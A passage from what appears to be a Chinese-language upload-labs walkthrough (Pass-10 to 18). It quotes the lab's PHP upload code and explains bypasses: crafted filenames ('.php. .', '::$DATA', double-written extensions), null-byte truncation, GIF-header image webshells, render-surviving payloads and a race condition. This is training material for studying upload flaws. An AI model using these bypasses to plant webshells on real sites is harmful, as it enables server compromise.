$file_ext);//去除字符串::$DATA</code><br><code>NTFS</code>文件系统包括对<code>备用数据流</code>的支持，主要包括提供与Macintosh文件系统中的文件的兼容性。<strong>备用数据流</strong>允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：<code>$ DATA</code>。</p><p>上传<code>.php::$DATA</code>绕过。(<strong>仅限windows</strong>)</p><h2 id="Pass-10-代码审计"><a href="#Pass-10-代码审计" class="headerlink" title="Pass-10(代码审计)"></a>Pass-10(代码审计)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">$file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">$file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">$file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">$file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">$file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">$file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure><p>查看源码，这里只过滤了一次，所以直接构造 <code>.php. .</code> 绕过，传文件名后加上<em>点+空格+点</em></p><p><strong>分析源码</strong></p><p>​        首先经过<a href="http://www.w3school.com.cn/php/func_string_trim.asp">trim()</a>函数去除了文件名两边的空格，而后经过<code>deldot</code>函数去除文件名末尾的点，再从右向左取第一个<code>.</code>，取出这个点到结尾的字符串为文件后缀，而后转化为小写，去除文件名中的<code>:: DATA</code>，再次去除首尾的空格。 当构造<code>. .</code>时，首先去除掉最右边的点，变成了<code>.空格</code>，而后取后缀就变成了<code>.空格</code>也就是`</p><p><code>DATA</code>，再次去除首尾的空格。当构造<code>..</code>时，首先去除掉最右边的点，变成了<code>.空格</code>，然后取后缀就变成了<code>.空格</code>也就是<code>‘file_ext=&quot;. &quot;</code>,<code>最后经过过滤，</code> file_ext<code>变为了. 经过了判断，此时</code> fileext‘变为了.通过了判断，此时‘file_name`末尾为.空格，上传到服务器时就会自动转化为php</p><h2 id="Pass-11-双写"><a href="#Pass-11-双写" class="headerlink" title="Pass-11(双写)"></a>Pass-11(双写)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_name &#x3D; str_ireplace($deny_ext,&quot;&quot;, $file_name);</span><br></pre></td></tr></table></figure><p>这里是将黑名单里的<code>后缀替换为空</code>，可以利用双写绕过<br>构造<code>.pphpph</code>,成功上传解析执行。</p><h2 id="Pass-12（-00截断）"><a href="#Pass-12（-00截断）" class="headerlink" title="Pass-12（%00截断）"></a>Pass-12（%00截断）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$img_path &#x3D; $_GET[&#39;save_path&#39;].&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br></pre></td></tr></table></figure><p>可以参考这篇文章：<a href="https://www.cnblogs.com/cyjaysun/p/4390930.html">PHP任意文件上传漏洞CVE-2015-2348浅析</a></p><p><code>save_path</code> 是一个可控的变量，可以使用<code>%00</code>截断</p><p>看代码已经用了白名单了，但是这里有一个<code>$_GET[&#39;save_path&#39;]</code>用<code>get</code>来传递参数后面再加上后缀名</p><p>在url中<code>%00</code>表示<code>ascll</code>码中的<code>0</code> ，而ascii中0作为特殊字符保留，<strong>表示字符串结束</strong>，所以当url中出现%00时就会认为读取已结束。使用条件：</p><ul><li>php 版本<code>&lt;5.3.4 </code>才有可能存在此漏洞</li><li>php的<code>magic_quotes_gpc</code>为OFF状态</li></ul><h2 id="Pass-13（0x00截断）"><a href="#Pass-13（0x00截断）" class="headerlink" title="Pass-13（0x00截断）"></a>Pass-13（0x00截断）</h2><p>原理同Pass-12,只不过<code>save_path</code>是通过post传进来的，需要在Hex里修改</p><p>区别就在于<code>GET</code>和<code>POST</code>,<code>GET</code>是可以把url自动转码的，但是<code>POST</code>不会，所以我们要做一些改动。</p><p><img src="/2020/07/15/upload-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/20190805095929.png" alt="img"><img src="/2020/07/15/upload-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/20190805100023.png" alt="img"></p><p><code>+</code>的URL编码的16进制 为2b，将2b改为00即可</p><h2 id="Pass-14（文件头）"><a href="#Pass-14（文件头）" class="headerlink" title="Pass-14（文件头）"></a>Pass-14（文件头）</h2><p>这一关通过读文件的<strong>前2个字节判断文件类型</strong>,直接使用 cmd命令生成图片木马上传</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy pikachu.gif /b + cmd.php /a cmd.gif      <span class="comment">#b是二进制，a是ascii</span></span><br></pre></td></tr></table></figure><p>用给出的文件包含漏洞页面来测试图片马是否能正常运行！</p><p><img src="/2020/07/15/upload-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20200527215441452.png" alt="image-20200527215441452"></p><p><strong>绕过文件头检查</strong>，添加GIF图片的文件头<code>GIF89a</code>，绕过GIF图片检查</p><p><img src="/2020/07/15/upload-labs%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20200527215248094.png" alt="image-20200527215248094"></p><p><strong>源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params">$filename</span>)</span>&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">&quot;C2chars&quot;</span>, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">&#x27;chars1&#x27;</span>].$strInfo[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    $fileType = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>($typeCode)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            $fileType = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($file_type == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        $msg = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$file_type;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这关主要是利用了一个判断文件的函数</p><ol><li><code>fopen</code>打开文件数据流</li><li><code>fread</code>读取2个字节</li><li>用<code>unpack</code>对二进制数据进行解包，<code>C</code>代表无符号字节型，后面的<code>2</code>代表个数，也可以用<code>*</code>代替</li><li>把两个<code>chars</code>连接起来再用<code>intval</code>转换为整数型</li></ol><p>图片马，具体操作可以参考<a href="https://link.zhihu.com/?target=http://gv7.me/articles/2017/picture-trojan-horse-making-method/">http://gv7.me/articles/2017/picture-trojan-horse-making-method/</a></p><h2 id="Pass-15（getimagesize）"><a href="#Pass-15（getimagesize）" class="headerlink" title="Pass-15（getimagesize）"></a>Pass-15（getimagesize）</h2><p>这一关使用<code>getimagesize</code>获取<strong>文件类型</strong>，直接就可以利用<strong>图片马</strong>进行绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params">$filename</span>)</span>&#123;</span><br><span class="line">    $types = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>getimagesize</code>判断图片内置函数</p><p><code>image_type_to_extension</code>取文件后缀的内置函数</p><h2 id="Pass-16（exif-imagetype-）"><a href="#Pass-16（exif-imagetype-）" class="headerlink" title="Pass-16（exif_imagetype()）"></a>Pass-16（exif_imagetype()）</h2><p>使用<code>exif_imagetype()</code>检查是否为图片文件,直接就可以利用图片马就可进行绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params">$filename</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br><span class="line">    <span class="keyword">switch</span> ($image_type) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Pass-17（二次渲染）"><a href="#Pass-17（二次渲染）" class="headerlink" title="Pass-17（二次渲染）"></a>Pass-17（二次渲染）</h2><p><strong>原理：</strong>将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的。</p><p><strong>imagecreatefromjpeg二次渲染</strong>它相当于是把原本属于图像数据的部分抓了出来，再用自己的API 或函数进行重新渲染，在这个过程中非图像数据的部分直接就隔离开了。</p><p>本关判断了<code>后缀名</code>、<code>content-type</code>，以及利用<code>imagecreatefromgif</code>判断是否为gif图片，最后再做了一次二次渲染<br>具体可以参考这篇文章：<a href="https://xz.aliyun.com/t/2657">upload-labs之pass 16详细分析</a></p><p>先上传图片码，然后下载下来，用16进制编辑器打开，寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，<br>将Webshell代码插在该部分，然后上传即可<br>jpg和png很麻烦，gif直接修改没有改变的区域即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    $filename = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    $filetype = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    $tmpname = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    $target_path=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.basename($filename);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    $fileext= substr(strrchr($filename,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>(($fileext == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; ($filetype==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="literal">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$newfilename;</span><br><span class="line">                imagejpeg($im,$img_path);</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">&quot;png&quot;</span>) &amp;&amp; ($filetype==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="literal">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$newfilename;</span><br><span class="line">                imagepng($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="literal">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">&quot;gif&quot;</span>) &amp;&amp; ($filetype==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromgif($target_path);</span><br><span class="line">            <span class="keyword">if</span>($im == <span class="literal">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$newfilename;</span><br><span class="line">                imagegif($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Pass-18（条件竞争）"><a href="#Pass-18（条件竞争）" class="headerlink" title="Pass-18（条件竞争）"></a>Pass-18（条件竞争）</h2><p><strong>Key:利用条件竞争删除文件时间差绕过</strong></p><p>本关文件<code>先经过保存，然后判断后缀名是否在白名单中</code>，如果不在则删除。此时可以利用条件竞争在<code>保存文件后删除文件前</code>来执行php文件。<br>可以用burp suite中的Intruder模块同时批量上传、访问webshell，将payloads中的payload type设置为Null payload,Generate payload次数多点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span 